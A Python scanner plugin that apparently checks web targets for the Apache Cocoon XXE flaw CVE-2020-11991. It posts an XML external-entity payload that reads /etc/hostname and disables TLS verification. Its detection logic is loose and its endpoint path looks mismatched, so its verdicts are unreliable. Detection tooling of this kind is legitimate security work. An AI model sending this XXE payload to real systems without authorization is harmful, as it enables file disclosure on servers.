import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ApacheCocoonVuln:
    name = "Apache Cocoon XML注入漏洞 (CVE-2020-11991)"
    description = "Apache Cocoon XML外部实体注入漏洞检测"
    author = "Security Researcher"
    group = "Web Servers"
    
    def check(self, target):
        """
        检测Apache Cocoon是否存在CVE-2020-11991漏洞
        :param target: 目标URL (如 https://example.com)
        :return: 检测结果字符串
        """
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
            
        result = ""
        test_url = target.rstrip("/") + "/v2/api/product/manger/getInfo"
        
        # 使用无害的测试文件（避免读取敏感信息）
        test_payload = """
            <!--?xml version="1.0" ?-->
            <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
            <userInfo>
            <firstName>Test</firstName>
            <lastName>&xxe;</lastName>
            </userInfo>
        """
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type": "text/xml"
        }
        
        try:
            response = requests.post(
                test_url,
                data=test_payload,
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # 检测响应中是否包含文件内容（但不检查具体内容）
            if response.status_code == 200 and len(response.text) > 300:
                # 检查是否返回了XML解析错误（无害确认）
                if "XML" in response.text and "DOCTYPE" in response.text:
                    result = f"[{self.name}] 目标 {target}：存在CVE-2020-11991漏洞（可XXE注入）"
                else:
                    result = f"[{self.name}] 目标 {target}：可能存在CVE-2020-11991漏洞（需进一步验证）"
            else:
                result = f"[{self.name}] 目标 {target}：未发现CVE-2020-11991漏洞"
                
        except requests.exceptions.Timeout:
            result = f"[{self.name}] 目标 {target}：检测超时"
        except requests.exceptions.ConnectionError:
            result = f"[{self.name}] 目标 {target}：连接失败"
        except Exception as e:
            result = f"[{self.name}] 目标 {target}：检测异常 - {str(e)}"
        
        return result